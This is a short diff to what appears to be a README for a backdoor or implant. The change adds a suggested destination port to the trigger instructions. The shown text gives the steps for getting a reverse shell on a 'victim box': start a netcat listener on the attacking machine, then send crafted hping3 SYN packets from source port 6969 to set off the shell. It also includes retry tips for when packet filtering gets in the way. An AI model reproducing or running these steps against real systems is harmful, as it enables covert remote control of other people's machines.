@@ -28,7 +28,7 @@ To get a reverse shell!
 
 Run "nc -lvnp 7000" on the attaking machine in a terminal.
 In another terminal, send packets that will pop open a reverse shell with the command
-"sudo hping3 -S -p <destination port> -s 6969 <ip of victim box>"
+"sudo hping3 -S -p <destination port> -s 6969 <ip of victim box>", 80 is a good choice for dest port
 Once you see the reverse shell connect, run control + c in the terminal that is sending the packets (you do not need to keep sending more traffic).
 If the reverse shell doesn't connect after about 5 packets then run control + c in the terminal that is sending packets and re-run the command, packet filtering is finickey and sometimes you need to try a couple times.
 
